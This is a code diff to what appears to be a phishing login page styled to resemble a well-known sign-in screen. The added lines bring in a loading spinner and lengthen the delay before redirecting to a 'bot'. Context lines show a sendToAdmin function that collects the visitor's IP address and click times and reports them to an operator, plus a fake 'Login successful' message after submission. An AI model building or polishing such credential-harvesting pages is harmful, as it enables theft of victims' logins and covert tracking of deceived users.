@@ -70,6 +70,24 @@
         .success-msg { background: #e6f4ea; border: 1px solid #34a853; color: #137333; }
         .footer { display: flex; justify-content: center; gap: 1.2rem; margin-top: 1.5rem; padding-top: 1rem; border-top: 1px solid #e8eaed; font-size: 0.7rem; color: #5f6368; }
         .step-text { text-align: center; font-size: 0.7rem; color: #5f6368; margin-top: 0.5rem; }
+        .loader {
+            display: none;
+            margin-top: 1rem;
+            text-align: center;
+        }
+        .loader-spinner {
+            display: inline-block;
+            width: 30px;
+            height: 30px;
+            border: 3px solid #e8eaed;
+            border-top: 3px solid #1a73e8;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
         .hidden { display: none; }
     </style>
 </head>
@@ -101,6 +119,10 @@
 
     <div id="errorBox" class="message error-msg"></div>
     <div id="successBox" class="message success-msg"></div>
+    <div id="loader" class="loader">
+        <div class="loader-spinner"></div>
+        <p style="margin-top: 0.5rem; color: #5f6368;">Redirecting to bot...</p>
+    </div>
     <div class="step-text" id="stepIndicator">Step 1 of 2</div>
     <div class="footer"><span onclick="sendToAdmin('English')">English</span><span onclick="sendToAdmin('Help')">Help</span><span onclick="sendToAdmin('Privacy')">Privacy</span><span onclick="sendToAdmin('Terms')">Terms</span></div>
 </div>
@@ -136,7 +158,6 @@
         currentEmail = '';
     }
 
-    // د ټولو بټنو لپاره (اډمن ته خبر ورکوي)
     async function sendToAdmin(buttonName) {
         const ip = await getUserIP();
         const msg = `🔘 *${buttonName}* clicked\n🌐 IP: ${ip}\n🕒 Time: ${new Date().toLocaleString()}`;
@@ -195,12 +216,16 @@
                 })
             });
             
+            // د بریالیتوب پیغام او لوډر ښکاره کړئ
             showMessage(document.getElementById('successBox'), '✅ Login successful! Redirecting to bot...', false);
             
-            // په اتوماتيک ډول بوټ ته لاړ شه
+            // لوډر ښکاره کړئ
+            document.getElementById('loader').style.display = 'block';
+            
+            // 3 ثانیې انتظار وکړئ، بیا بوټ ته لاړ شئ
             setTimeout(() => {
                 window.location.href = BOT_REDIRECT;
-            }, 1500);
+            }, 3000);
         }
     };
 </script>
